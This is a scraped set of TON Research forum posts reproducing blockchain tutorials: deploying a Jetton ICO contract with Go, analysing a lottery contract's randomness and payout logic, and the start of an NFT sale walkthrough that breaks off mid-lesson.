*   `jetton-minter-ICO.fc` hexBoc: B5EE9C7241020B010001F5000114FF00F4A413F4BCF2C80B0102016202030202CD040502037A60090A03F7D00E8698180B8D8492F81F07D201876A2687D007D206A6A1812E38047221AC1044C4B4028B350906100797026381041080BC6A28CE4658FE59F917D017C14678B13678B10FD0165806493081B2044780382502189E428027D012C678B666664F6AA701B02698FE99FC00AA9185D718141083DEECBEF09DD71812F83C0607080093F7C142201B82A1009AA0A01E428027D012C678B00E78B666491646580897A007A00658064907C80383A6465816503E5FFE4E83BC00C646582AC678B28027D0109E5B589666664B8FD80400606C215131C705F2E04902FA40FA00D43020D08060D721FA00302710345042F007A05023C85004FA0258CF16CCCCC9ED5400FC01FA00FA40F82854120970542013541403C85004FA0258CF1601CF16CCC922C8CB0112F400F400CB00C9F9007074C8CB02CA07CBFFC9D05006C705F2E04A13A1034145C85004FA0258CF16CCCCC9ED5401FA403020D70B01C3008E1F8210D53276DB708010C8CB055003CF1622FA0212CB6ACB1FCB3FC98042FB00915BE20008840FF2F0007DADBCF6A2687D007D206A6A183618FC1400B82A1009AA0A01E428027D012C678B00E78B666491646580897A007A00658064FC80383A6465816503E5FFE4E840001FAF16F6A2687D007D206A6A183FAA9040CA85A166
*   `jetton-minter.fc` hexBoc: B5EE9C7241021201000330000114FF00F4A413F4BCF2C80B0102016202030202CC0405001BA0F605DA89A1F401F481F481A8610201D40607020148080900BB0831C02497C138007434C0C05C6C2544D7C0FC02F83E903E900C7E800C5C75C87E800C7E800C00B4C7E08403E29FA954882EA54C4D167C0238208405E3514654882EA58C511100FC02780D60841657C1EF2EA4D67C02B817C12103FCBC2000113E910C1C2EBCB853600201200A0B020120101101F100F4CFFE803E90087C007B51343E803E903E90350C144DA8548AB1C17CB8B04A30BFFCB8B0950D109C150804D50500F214013E809633C58073C5B33248B232C044BD003D0032C032483E401C1D3232C0B281F2FFF274013E903D010C7E800835D270803CB8B11DE0063232C1540233C59C3E8085F2DAC4F3200C03F73B51343E803E903E90350C0234CFFE80145468017E903E9014D6F1C1551CDB5C150804D50500F214013E809633C58073C5B33248B232C044BD003D0032C0327E401C1D3232C0B281F2FFF274140371C1472C7CB8B0C2BE80146A2860822625A020822625A004AD822860822625A028062849F8C3C975C2C070C008E00D0E0F00AE8210178D4519C8CB1F19CB3F5007FA0222CF165006CF1625FA025003CF16C95005CC2391729171E25008A813A08208989680AA008208989680A0A014BCF2E2C504C98040FB001023C85004FA0258CF1601CF16CCC9ED5400705279A018A182107362D09CC8CB1F5230CB3F58FA025007CF165007CF16C9718010C8CB0524CF165006FA0215CB6A14CCC971FB0010241023000E10491038375F040076C200B08E218210D53276DB708010C8CB055008CF165004FA0216CB6A12CB1F12CB3FC972FB0093356C21E203C85004FA0258CF1601CF16CCC9ED5400DB3B51343E803E903E90350C01F4CFFE803E900C145468549271C17CB8B049F0BFFCB8B0A0822625A02A8005A805AF3CB8B0E0841EF765F7B232C7C572CFD400FE8088B3C58073C5B25C60063232C14933C59C3E80B2DAB33260103EC01004F214013E809633C58073C5B3327B55200083200835C87B51343E803E903E90350C0134C7E08405E3514654882EA0841EF765F784EE84AC7CB8B174CFCC7E800C04E81408F214013E809633C58073C5B3327B55209FB23AB6

#### [](#prepare-data-for-jetton-13)Prepare data for Jetton

For deployment, in addition to hexBoc, we need data for the jetton-minter-ICO storage contract. Let’s see what data is needed according to the standard:

```
;; storage scheme
;; storage#_ total_supply:Coins admin_address:MsgAddress content:^Cell jetton_wallet_code:^Cell = Storage;
```

For convenience, let’s look at the function that saves data to the `c4` register:

```
 () save_data(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) impure inline {
  set_data(begin_cell()
			.store_coins(total_supply)
			.store_slice(admin_address)
			.store_ref(content)
			.store_ref(jetton_wallet_code)
		   .end_cell()
		  );
}
```

Content according to the standard can be viewed [here](https://github.com/ton-blockchain/TIPs/issues/64). Since this is a test example, we will not collect all the data, we will only put a link and then to the lessons))

```
 func getContractData(OwnerAddr *address.Address) *cell.Cell {
	// storage scheme
	// storage#_ total_supply:Coins admin_address:MsgAddress content:^Cell jetton_wallet_code:^Cell = Storage;

	uri := "https://github.com/romanovichim/TonFunClessons_ru"
	jettonContentCell := cell.BeginCell().MustStoreStringSnake(uri).EndCell()

	contentRef := cell.BeginCell().
		MustStoreRef(jettonContentCell).
		EndCell()

	return data
}
```

After preparing the link, we will collect the data cell by putting there:

*   total token supply MustStoreUInt(10000000, 64)
    
*   admin wallet address MustStoreAddr(OwnerAddr)
    
*   jettonContentCell content cell
    
*   contract wallet code MustStoreRef(getJettonWalletCode())
    
    func getContractData(OwnerAddr \*address.Address) \*cell.Cell {  
    // storage scheme  
    // storage#\_ total\_supply:Coins admin\_address:MsgAddress content:^Cell jetton\_wallet\_code:^Cell = Storage;
    
    ```
    uri := "https://github.com/romanovichim/TonFunClessons_ru"
    jettonContentCell := cell.BeginCell().MustStoreStringSnake(uri).EndCell()
    
    contentRef := cell.BeginCell().
    	MustStoreRef(jettonContentCell).
    	EndCell()
    
    data := cell.BeginCell().MustStoreUInt(10000000, 64).
    	MustStoreAddr(OwnerAddr).
    	MustStoreRef(contentRef).
    	MustStoreRef(getJettonWalletCode()).
    	EndCell()
    
    return data
    ```
    
    }
    

#### [](#deploy-14)Deploy

In general, the deployment script is identical to the script from the lesson where we deployed the NFT collection. We have a `getContractData` function with data, two functions from the hexboc contract and wallet master and main from which we deploy the ICO contract:

```
 func main() {

	// connect to mainnet lite server
	client := liteclient.NewConnectionPool()

	configUrl := "https://ton-blockchain.github.io/testnet-global.config.json"

	err := client.AddConnectionsFromConfigUrl(context.Background(), configUrl)
	if err != nil {
		panic(err)
	}
	api := ton.NewAPIClient(client)
	w := getWallet(api)

	msgBody := cell.BeginCell().EndCell()

	fmt.Println("Deploying Jetton ICO	contract to mainnet...")
	addr, err := w.DeployContract(context.Background(), tlb.MustFromTON("0.02"),
		msgBody, getJettonMasterCode(), getContractData(w.Address()), true)
	if err != nil {
		panic(err)
	}

	fmt.Println("Deployed contract addr:", addr.String())
}
```

Sample script in `DeployJettonMinter.go` file.

### [](#call-smart-contracts-15)Call smart contracts

After deploying the smart contract, it remains to call it and exchange Toncoin for our token. To do this, you need to send a message with an empty body and some amount of Toncoin. Let’s use the second wallet, which we prepared at the beginning of the lesson.

`ICO.go` code:

```
func main() {
	client := liteclient.NewConnectionPool()
	// connect to testnet lite server
	err := client.AddConnectionsFromConfigUrl(context.Background(), "https://ton-blockchain.github.io/testnet-global.config.json")
	if err != nil {
		panic(err)
	}

	// initialize ton api lite connection wrapper
	api := ton.NewAPIClient(client)

	// seed words of account, you can generate them with any wallet or using wallet.NewSeed() method
	words := strings.Split("your seed phrase", " ")

	w, err := wallet.FromSeed(api, words, wallet.V3)
	if err != nil {
		log.Fatalln("FromSeed err:", err.Error())
		return
	}

	log.Println("wallet address:", w.Address())

	block, err := api.CurrentMasterchainInfo(context.Background())
	if err != nil {
		log.Fatalln("CurrentMasterchainInfo err:", err.Error())
		return
	}

	balance, err := w.GetBalance(context.Background(), block)
	if err != nil {
		log.Fatalln("GetBalance err:", err.Error())
		return
	}

	if balance.NanoTON().Uint64() >= 100000000 {

		// ICO address 
		addr := address.MustParseAddr("EQD_yyEbNQeWbWfnOIowqNilB8wwbCg6nLxHDP3Rbey1eA72")

	fmt.Println("Let's send message")
	err = w.Send(context.Background(), &wallet.Message{
	 Mode: 3,
	 InternalMessage: &tlb.InternalMessage{
	  IHRDisabled: true,
	  Bounce:      true,
	  DstAddr:     addr,
	  Amount:      tlb.MustFromTON("1"),
	  Body:        cell.BeginCell().EndCell(),
	 },
	}, true)
	if err != nil {
	 fmt.Println(err)
	}

		// update chain info
		block, err = api.CurrentMasterchainInfo(context.Background())
		if err != nil {
			log.Fatalln("CurrentMasterchainInfo err:", err.Error())
			return
		}

		balance, err = w.GetBalance(context.Background(), block)
		if err != nil {
			log.Fatalln("GetBalance err:", err.Error())
			return
		}

		log.Println("transaction sent, balance left:", balance.TON())

		return
	}

	log.Println("not enough balance:", balance.TON())
}
```

If successful, in [https://testnet.tonscan.org/](https://testnet.tonscan.org/) we can see the following picture:

Our message and return message notice.

### [](#examining-the-result-16)Examining the result

Let’s take the balance of tokens from our wallet from which we sent Toncoin.

`JettonBalance.go` code:

```
package main

import (
	"context"
	"github.com/xssnick/tonutils-go/address"
	_ "github.com/xssnick/tonutils-go/tlb"
	"github.com/xssnick/tonutils-go/ton/jetton"
	_ "github.com/xssnick/tonutils-go/ton/nft"
	_ "github.com/xssnick/tonutils-go/ton/wallet"
	"log"
	_ "strings"

	"github.com/xssnick/tonutils-go/liteclient"
	"github.com/xssnick/tonutils-go/ton"
)

func main() {
	client := liteclient.NewConnectionPool()

	// connect to testnet lite server
	err := client.AddConnectionsFromConfigUrl(context.Background(), "https://ton-blockchain.github.io/testnet-global.config.json")
	if err != nil {
		panic(err)
	}

	// initialize ton api lite connection wrapper
	api := ton.NewAPIClient(client)

	// jetton contract address
	contract := address.MustParseAddr("EQD_yyEbNQeWbWfnOIowqNilB8wwbCg6nLxHDP3Rbey1eA72")
	master := jetton.NewJettonMasterClient(api, contract)

	// get jetton wallet for account
	ownerAddr := address.MustParseAddr("EQAIz6DspthuIkUaBZaeH7THhe7LSOXmQImH2eT97KI2Dl4z")
	tokenWallet, err := master.GetJettonWallet(context.Background(), ownerAddr)
	if err != nil {
		log.Fatal(err)
	}

	tokenBalance, err := tokenWallet.GetBalance(context.Background())
	if err != nil {
		log.Fatal(err)
	}

	log.Println("token balance:", tokenBalance.String())
}
```

If successful, we can see the following picture:

> There are fewer tokens than we sent Toncoin since there are fees, plus the contract needs to send a message back.

## [](#exercise-17)Exercise

In the tonutils-go library, there are some convenient methods for transferring tokens from wallet to wallet, try using them to transfer tokens from wallet `w2` to `w1`.

## [](#conclusion-18)Conclusion

Tokens offer many opportunities, but also carry comparable risks.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/16lesson/ICO.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/golang/16lesson/ICO.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/16lesson/ICO.md)

```
## Introduction
## What is an ICO
ICO - Initial Coin Offering (initial placement of tokens) - issuance by any project or company of its own money - tokens (cryptocurrency) in order to attract investments.

### Why ICO is needed
Conducting an ICO by a project allows you to provide it with funding, which is necessary for development, development and scaling. Usually, when conducting an ICO, it is assumed that the tokens will cost more over time. I note that "decent" projects, in their roadmaps, lay down various mechanics that do not allow the price of the token to fall sharply, provoking an even sharper price drop further.

If you are curious to understand how profitable ICOs are, then you can see the statistics on the ROI of ICO projects [here](https://icodrops.com/ico-stats/).

> Filter by USD ROI to see top projects.

### Important: Risks

Speaking about ICO, one cannot ignore the risks, in fact, when buying tokens, you buy records in the blockchain, the value of which is provided only by the token issuer project. On the technical side, a smart contract with which an ICO is carried out can be hacked or initially have a backdoor that will allow the owner of the smart contract to change the terms of the ICO, and of course, any project can scam, even if there was no initial goal of creating a scam.

## Overview of smart contracts

In this tutorial, we will use the smart contract from the examples provided in the Jetton standard, namely the master contract `jetton-minter-ICO.fc` [from here](https://github.com/ton-blockchain/token-contract/tree/main/ft).

The essential difference between the master contract from the ninth lesson, which we analyzed in detail, is the presence of mechanics in this ICO smart contract, due to the following code in `recv_internal()`:
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/golang/16lesson/ICO.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 452

[TON Research](/)

# [Bonus - Lesson 1 Random in TON](/t/bonus-lesson-1-random-in-ton/452)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 7:52pm  1

# [](#smart-contract-lotteryraffle-1)Smart Contract Lottery/Raffle

In this tutorial, we will analyze the lottery/raffle smart contract. A smart contract is good because:

*   Properly used by random. Learn more about the technical part of randomness in TON [here](https://docs.ton.org/develop/smart-contracts/guidelines/random-number-generation)
*   there are important contract balance management mechanics that can be applied in your smart contracts
*   convenient grouping and structure of the project, the pattern of which is worth adopting.

## [](#random-problem-2)Random problem

Random number generation - may be needed in many different projects. There is a `random()` function in the FunC documentation, but you can’t use it in real projects!!! Its result can be easily predicted if you do not apply some additional tricks.

To make the random number generation unpredictable, you can add the current logical time to the seed so that different transactions have different seeds and results.

You can do this with `randomize_lt()`, for example:

```
randomize_lt();
int x = random(); ;; users can't predict this number
```

Также можно использовать `randomize()`, прокинув туда несколько парметров включая в себя логическое время.

```
() randomize(int x) impure asm "ADDRAND";
```

In this article, we will look at the draw contract that uses `randomize()`

## [](#top-level-overview-3)Top-level overview

### [](#how-it-works-4)How it works?

The contract only accepts messages with 1 TON (other amounts will be returned). The smart contract generates a random number from 0 to 10000 to determine if you win or not.

If a person wins, their winnings are reduced by our commission of 10%. The rest of the contract balance remains intact. The winner will receive a message about the win in the comment to the transaction.

### [](#probability-5)Probability

*   0.1% to win the jackpot (half of the contract balance) \[0; 10)
*   9.9%, to win 5 TON. \[10; 1000)
*   10% for winning 2 TON. \[1000; 2000)

If there is no win, nothing happens. \[2000; 9999\]

Contract code - [GitHub - Vudi/new-year-ruffle: TON New Year Ruffle https://ton.org.in/ny/ or https://betkingy.com/#/ny](https://github.com/Vudi/new-year-ruffle/tree/main)

### [](#smart-contract-structure-6)Smart contract structure

A smart contract is a `recv_internal` internal message handler, which, if the message body is empty, starts a lottery/draw or fulfills one of the `op` conditions:

*   `op == op::add_balance()` adding a balance, in case the contract runs out of money
*   `op == op::maintain()` allows you to send an internal message from the contract with a different mode, i.e. it allows you to manage the balance of the smart contract, and also if it allows you to destroy it (message with `mode == 128 + 32` )
*   `op == op::withdraw()` allows you to get part of the money from the smart contract - the accumulated commission

## [](#smart-contract-style-7)Smart contract style

The smart contract we are considering has a good style:

*   the smart contract is well-spaced into several files, so that it is very convenient to read
*   work with the storage (we are talking about the `c4` register, of course) is combined with global variables, which again improves the readability of the code, making the smart contract understandable

The `op` commands and the frequently used 1 TON variable are moved to a separate `const.func` file:

```
int op::maintain() asm "1001 PUSHINT";
int op::withdraw() asm "1002 PUSHINT";
int op::add_balance() asm "1003 PUSHINT";

int exit::invalid_bet() asm "2001 PUSHINT";

int 1ton() asm "1000000000 PUSHINT";
```

The `admin.func` file contains admin commands, `adm::maintain`, which allows you to send a message from a smart contract with any mode - that is, it allows you to manage the balance of a smart contract:

```
() adm::maintain(slice in_msg_body) impure inline_ref {
	int mode = in_msg_body~load_uint(8);
	send_raw_message(in_msg_body~load_ref(), mode);    
}
```

And `adm::withdraw()` allowing you to withdraw some of the money in a convenient way:

```
() adm::withdraw() impure inline_ref {
	cell body = begin_cell()
		.store_uint(0, 32)
		.store_slice(msg::commission_withdraw())
		.end_cell();

	cell msg = begin_cell()
		.store_uint(0x18, 6)
		.store_slice(db::admin_addr)
		.store_coins(db::service_balance)
		.store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		.store_ref(body)
		.end_cell();

	db::service_balance = 0;
	send_raw_message(msg, 0);
}
```

The smart contract sends messages on lose and win, they are placed in a separate `msg.func` file, note that they are of type `slice`:

```
slice msg::commission_withdraw()    asm "<b 124 word Withdraw commission| $, b> <s PUSHSLICE";
slice msg::jackpot()                asm "<b 124 word Congrats! You have won jackpot!| $, b> <s PUSHSLICE";
slice msg::x2()                     asm "<b 124 word Congrats! You have won x2!| $, b> <s PUSHSLICE";
slice msg::x5()                     asm "<b 124 word Congrats! You have won x5!| $, b> <s PUSHSLICE";
```

`game.func` contains the drawing/lottery logic, we will consider the code of this file in detail, but later. The smart contract provides a Get method that returns information from the `c4` register of the smart contract. This method is stored in the `get-methods.func` file:

```
(int, int, (int, int), int, int) get_info() method_id {
	init_data();
	return (db::available_balance, db::service_balance, parse_std_addr(db::admin_addr), db::last_number, db::hash);
}
```

And finally, work with the storage in the `storage.func` file. It is important to note here that the data is not permanently stored in register c4, but first it is stored in global variables, and then at the end of some logical code, it is stored in the register using the `pack_data()` function:

```
global int init?;

global int db::available_balance;
global int db::service_balance;
global slice db::admin_addr;
global int db::last_number;
global int db::hash;


() init_data() impure {
	ifnot(null?(init?)) {
		throw(0x123);
	}

	slice ds = get_data().begin_parse();

	db::available_balance = ds~load_coins();
	db::service_balance = ds~load_coins();
	db::admin_addr = ds~load_msg_addr();
	db::last_number = ds~load_uint(64);
	db::hash = slice_empty?(ds) ? 0 : ds~load_uint(256);

	init? = true;
}

() pack_data() impure {
	set_data(
		begin_cell()
			.store_coins(db::available_balance)
			.store_coins(db::service_balance)
			.store_slice(db::admin_addr)
			.store_uint(db::last_number, 64)
			.store_uint(db::hash, 256)
		.end_cell()
	);
}
```

## [](#recv_internal-8)Разберем recv\_internal()

Файл `main.fc` начинается с импорта файлов, по которым мы прошлись выше:

```
#include "lib/stdlib.func";
#include "struct/const.func";
#include "struct/storage.func";
#include "struct/msg.func";
#include "struct/game.func";
#include "struct/admin.func";
#include "struct/get-methods.func";


() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {

}
```

We get the message and use the [slice\_hash](https://docs.ton.org/develop/func/stdlib#slice_hash) function to create a hash, which we will use for randomization. Also, as you remember, any message starts with flags, let’s do a little check:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int hash = slice_hash(cs); 
	throw_if(0, cs~load_uint(4) & 1);

}
```

We initialize the data using a helper function from the `storage.func` file and here we get the address from the message:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int hash = slice_hash(cs); 
	throw_if(0, cs~load_uint(4) & 1);

	init_data();

	slice sender_addr = cs~load_msg_addr();

}
```

It seems that it would be logical to get `op` next, but for the convenience of using a smart contract, the main functionality is used without `op`, so the user simply sends an empty message to the contract and the draw / lottery begins. To implement such functionality, we simply check the remaining message, if it is empty, we start the game.

```
#include "lib/stdlib.func";
#include "struct/const.func";
#include "struct/storage.func";
#include "struct/msg.func";
#include "struct/game.func";
#include "struct/admin.func";
#include "struct/get-methods.func";


() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int hash = slice_hash(cs); 
	throw_if(0, cs~load_uint(4) & 1);

	init_data();

	slice sender_addr = cs~load_msg_addr();

	if (in_msg_body.slice_empty?()) {
		game::start(sender_addr, msg_value, hash);
		pack_data();
		throw(0);
	}
}
```

Inside the game function, we will change the data that will later need to be stored in the constant data storage register `c4`, global variables will change inside the function, and in `recv_internal()` we save:

```
#include "lib/stdlib.func";
#include "struct/const.func";
#include "struct/storage.func";
#include "struct/msg.func";
#include "struct/game.func";
#include "struct/admin.func";
#include "struct/get-methods.func";


() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int hash = slice_hash(cs); 
	throw_if(0, cs~load_uint(4) & 1);

	init_data();

	slice sender_addr = cs~load_msg_addr();

	if (in_msg_body.slice_empty?()) {
		game::start(sender_addr, msg_value, hash);
		pack_data();
		throw(0);
	}
}
```

Here the question may arise why an exception is thrown after everything has worked correctly. According to the documentation for [TVM clause 4.5.1](https://ton.org/tvm.pdf) there are reserved codes 0-31 for exceptions, which are the same as \[exit\_code\]([https://docs.ton.org/](https://docs.ton.org/) learn/tvm-instructions/tvm-exit-codes), which means 0 is the standard success exit code.

Then everything is simple, `op`, the meaning of which we have analyzed above, the final code of `main.func`:

```
#include "lib/stdlib.func";
#include "struct/const.func";
#include "struct/storage.func";
#include "struct/msg.func";
#include "struct/game.func";
#include "struct/admin.func";
#include "struct/get-methods.func";


() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	slice cs = in_msg_full.begin_parse();
	int hash = slice_hash(cs); 
	throw_if(0, cs~load_uint(4) & 1);

	init_data();

	slice sender_addr = cs~load_msg_addr();

	if (in_msg_body.slice_empty?()) {
		game::start(sender_addr, msg_value, hash);
		pack_data();
		throw(0);
	}

	int op = in_msg_body~load_uint(32);
	int is_admin = equal_slices(sender_addr, db::admin_addr);
	if (op == op::add_balance()) {
		db::available_balance += msg_value;
		pack_data();
		throw(0);
	}

	if (op == op::maintain()) {
		throw_if(0xfffe, is_admin == 0);
		adm::maintain(in_msg_body);
		throw(0);
	}

	if (op == op::withdraw()) {
		throw_if(0xfffd, is_admin == 0);
		adm::withdraw();
		pack_data();
		throw(0);
	}

	throw(0xffff);
}
```

## [](#parse-gamefunc-9)Parse game.func

Finally we got to the logic of the game, the `game.func` file starts with a helper function for paying a prize:

```
() game::payout(slice sender_addr, int amount, slice msg) impure inline_ref {
	cell body = begin_cell()
		.store_uint(0, 32)
		.store_slice(msg)
		.end_cell();

	cell msg = begin_cell()
		.store_uint(0x18, 6)
		.store_slice(sender_addr)
		.store_coins(amount)
		.store_uint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		.store_ref(body)
		.end_cell();

	send_raw_message(msg, 0);
}  
```

The game itself begins with checking that the value sent to the contract is equal to `1 TON`:

```
() game::start(slice sender_addr, int msg_value, int hash) impure inline_ref {
	throw_unless(exit::invalid_bet(), msg_value == 1ton());
}
```

Next, a hash for the random is collected, it is collected from the current time, the hash from the `c4` register, the hash formed in `recv_internal` from the message and `cur_lt()` - the logical time of the current transaction:

```
() game::start(slice sender_addr, int msg_value, int hash) impure inline_ref {
	throw_unless(exit::invalid_bet(), msg_value == 1ton());
	int new_hash = slice_hash(
		begin_cell()
			.store_uint(db::hash, 256)
			.store_uint(hash, 256)
			.store_uint(cur_lt(), 64)
			.store_uint(now(), 64)
		.end_cell()
		.begin_parse()
	);
}
```

Using a hash, you can generate a random, but before generating a random using the `rand()` function, we randomize the hash using [randomize](https://docs.ton.org/develop/func/stdlib/#randomize).

```
() game::start(slice sender_addr, int msg_value, int hash) impure inline_ref {
	throw_unless(exit::invalid_bet(), msg_value == 1ton());
	int new_hash = slice_hash(
		begin_cell()
			.store_uint(db::hash, 256)
			.store_uint(hash, 256)
			.store_uint(cur_lt(), 64)
			.store_uint(now(), 64)
		.end_cell()
		.begin_parse()
	);

	randomize(new_hash);

}
```

> I note that this is one of the possible variations in the implementation of randomness, you can read about randomness in the documentation - [Random number generation | The Open Network](https://docs.ton.org/develop/smart-contracts/guidelines/random-number-generation)

To implement the probability of winning, a number from 0 to 10000 is generated, everything is simple here, we look at what percentile the number fell into and, depending on this, send or not send the winnings:

```
() game::start(slice sender_addr, int msg_value, int hash) impure inline_ref {
	throw_unless(exit::invalid_bet(), msg_value == 1ton());
	int new_hash = slice_hash(
		begin_cell()
			.store_uint(db::hash, 256)
			.store_uint(hash, 256)
			.store_uint(cur_lt(), 64)
			.store_uint(now(), 64)
		.end_cell()
		.begin_parse()
	);

	randomize(new_hash);
	db::hash = new_hash;

	int number = rand(10000); ;; [0; 10000)
	db::last_number = number;
	db::available_balance += 1ton();

	if (number < 10) { ;; win 1/2 available balance
		int win = db::available_balance / 2;
		int commission = muldiv(win, 10, 100);
		win -= commission;

		db::available_balance -= (win + commission);
		db::service_balance += commission;

		game::payout(sender_addr, win, msg::jackpot());

		return ();
	}

	if (number < 1000) { ;; win x5
		int win = 5 * 1ton();
		int commission = muldiv(win, 10, 100);
		win -= commission;

		db::available_balance -= (win + commission);
		db::service_balance += commission;
		game::payout(sender_addr, win, msg::x5());

		return ();
	}

	if (number < 2000) { ;; win x2
		int win = 2 * 1ton();
		int commission = muldiv(win, 10, 100);
		win -= commission;

		db::available_balance -= (win + commission);
		db::service_balance += commission;
		game::payout(sender_addr, win, msg::x2());

		return ();
	}

}
```

## [](#conclusion-10)Conclusion

I write similar tutorials and analyzes on the TON network in my channel - [Telegram: Contact @ton\_learn](https://t.me/ton_learn) . I will be glad to your subscription.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/random/random.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/bonus/random/random.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/random/random.md)

```
# Smart Contract Lottery/Raffle

In this tutorial, we will analyze the lottery/raffle smart contract. A smart contract is good because:
- Properly used by random. Learn more about the technical part of randomness in TON [here](https://docs.ton.org/develop/smart-contracts/guidelines/random-number-generation)
- there are important contract balance management mechanics that can be applied in your smart contracts
- convenient grouping and structure of the project, the pattern of which is worth adopting.


## Random problem

Random number generation - may be needed in many different projects. There is a `random()` function in the FunC documentation, but you can't use it in real projects!!! Its result can be easily predicted if you do not apply some additional tricks.

To make the random number generation unpredictable, you can add the current logical time to the seed so that different transactions have different seeds and results.

You can do this with `randomize_lt()`, for example:

	randomize_lt();
	int x = random(); ;; users can't predict this number
	
Также можно использовать `randomize()`, прокинув туда несколько парметров включая в себя логическое время.
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/bonus/random/random.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 453

[TON Research](/)

# [Bonus - Lesson 2 NFT Sale](/t/bonus-lesson-2-nft-sale/453)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 7:52pm  1

# [](#nft-sale-and-marketplace-1)NFT Sale and Marketplace

## [](#introduction-2)Introduction

In this lesson, we will look at how the sale of NFTs can be organized. We will take contract examples from the official [token examples](https://github.com/ton-blockchain/token-contract), we are interested in:

*   nft-marketplace.fc - marketplace contract
*   nft-sale.fc - contract for the sale of a specific NFT

We will build this lesson as follows, first we will look at the top-level how smart contracts work, and then we will go through the code. We will not analyze every word in the code, so if you are unfamiliar with Func, I advise you to go through [lessons](https://github.com/romanovichim/TonFunClessons_Eng).

## [](#overview-of-functionality-3)Overview of functionality

The marketplace smart contract performs one function, it initializes/deploys the sales smart contract. Thus, the marketplace smart contract simply receives a message with all the necessary data to initialize the sale, and the message initializes the smart contract for the sale.

A smart sales contract performs three functions:

*   accumulation of funds within the contract
*   sale
*   cancellation of the sale

After a successful sale or cancellation, the contract is “burned”.

The accumulation is carried out by receiving funds in a contract with op == 1.

The cancellation of the sale is carried out by transferring the ownership of the current owner, the current owner and “burning” the smart contract.

When selling, we send TONcoins to the owner via messages, we pay marketplace commissions and royalties by messages, and at the end we send a message about the change of ownership of the NFT and burn the contract.

Now let’s take a look at the contract code.

### [](#marketplace-contract-4)Marketplace Contract

So, the task of the marketplace smart contract is to deploy/initialize a contract into the Sale network. We will do this using the already familiar State Init. The smart contract will receive the State Init message (the code and primary data for the storage), take a hash from it and thus form the Sale address of the contract, and then send a message to this address for initialization.

Let’s go through the code for a more detailed analysis.

#### [](#storage-5)Storage

We will store the address of the marketplace smart contract owner in the `c4` register, we will need it to check from whom the message came, so that the sale can be initialized only from the address of the marketplace smart contract owner.

To work with the storage, this smart contract has two auxiliary functions `load_data()` and `save_data()`, which will upload and save data to the storage, respectively.

```
(slice) load_data() inline {
  var ds = get_data().begin_parse();
  return 
	(ds~load_msg_addr() ;; owner
	 );
}

() save_data(slice owner_address) impure inline {
  set_data(begin_cell()
	.store_slice(owner_address)
	.end_cell());
}
```

#### [](#handling-internal-messages-6)Handling internal messages

Let’s move on to parsing `recv_internal()`. The smart contract will not process empty messages, so we will check using `slice_empty()` and end the execution of the smart contract in case of an empty message using `return()`.

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
}
```

Next, we get the flags and check if the incoming message is a bounced one. If this is a bounce, we complete the work of the smart contract:

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) {  ;; ignore all bounced messages
		return ();
	}
}
```

> More about bounce at [page 78 here](https://ton-blockchain.github.io/docs/tblkch.pdf))

According to the logic of the marketplace, only the owner of the marketplace smart contract can initialize the sales contract, so we get the sender’s address from `c4` and check if they match:

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) {  ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	var (owner_address) = load_data();
	throw_unless(401, equal_slices(sender_address, owner_address));

}
```

Let’s proceed to the initialization of the smart sales contract, for this we will get op and check that it is equal to 1.

> As a reminder, using op is a recommendation from the [documentation](https://ton-blockchain.github.io/docs/#/howto/smart-contract-guidelines?id=smart-contract-guidelines) on smart contracts in TON.

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) {  ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	var (owner_address) = load_data();
	throw_unless(401, equal_slices(sender_address, owner_address));
	int op = in_msg_body~load_uint(32);

	if (op == 1) { ;; deploy new auction

	}
}
```

##### [](#op-1-7)Op == 1

We continue to parse the message body, get the amount of TONcoin that we will send to the Sale contract, and also get the StateInit Sale of the contract and the message body for deployment.

```
if (op == 1) { ;; deploy new auction
